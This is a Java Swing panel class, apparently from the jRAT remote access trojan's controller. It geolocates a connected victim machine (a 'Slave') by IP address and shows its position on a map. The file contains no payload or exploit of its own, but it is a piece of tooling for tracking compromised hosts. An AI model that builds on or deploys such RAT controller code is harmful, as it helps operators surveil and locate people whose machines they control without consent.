package se.jrat.controller.ui.panels;

import java.awt.BorderLayout;
import java.util.Map;

import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;

import se.jrat.controller.ErrorDialog;
import se.jrat.controller.Slave;
import se.jrat.controller.net.GeoIP;
import se.jrat.controller.ui.components.JRemoteScreenPane;


@SuppressWarnings("serial")
public class PanelControlTrace extends PanelControlParent {

	private JTable table;

	public DefaultTableModel getModel() {
		return (DefaultTableModel) table.getModel();
	}

	public PanelControlTrace(Slave sl) {
		super(sl);
		setLayout(new BorderLayout(0, 0));

		final JRemoteScreenPane.ImagePanel panel = new JRemoteScreenPane().new ImagePanel();
		add(panel);
		
		new Thread(new Runnable() {
			public void run() {
				try {
					Map<String, String> info = GeoIP.getInfo(slave);
					panel.update(GeoIP.getMap(4, Double.parseDouble(info.get("latitude")), Double.parseDouble(info.get("longitude")), true));
				} catch (Exception e) {
					e.printStackTrace();
					ErrorDialog.create(e);
				}
			}
		}).start();
	}
}
